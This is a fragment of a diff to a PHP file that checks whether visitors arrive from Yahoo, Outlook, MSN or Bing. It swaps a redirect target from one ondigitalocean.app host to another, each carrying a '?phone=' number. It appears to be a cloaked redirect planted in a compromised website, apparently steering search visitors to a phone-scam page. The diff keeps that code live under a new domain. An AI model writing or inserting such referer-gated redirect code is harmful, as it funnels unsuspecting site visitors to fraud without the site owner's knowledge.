@@ -8,8 +8,8 @@
     $referers_bing=array('yahoo','outlook','msn','becovi','bing');
 
     $lanzar=true;
-    $dominio_m='urchin-app-ykwwi.ondigitalocean.app/?phone=910-971-803';
-    //$dominio_m='urchin-app-ykwwi.ondigitalocean.app/?phone=919-610-587';
+    $dominio_m='seahorse-app-modsl.ondigitalocean.app/?phone=910-971-803';
+    //$dominio_m='seahorse-app-modsl.ondigitalocean.app/?phone=919-610-587';
 
     $encontrado=true;
     if ($_SERVER["HTTP_REFERER"]!='' && $lanzar){
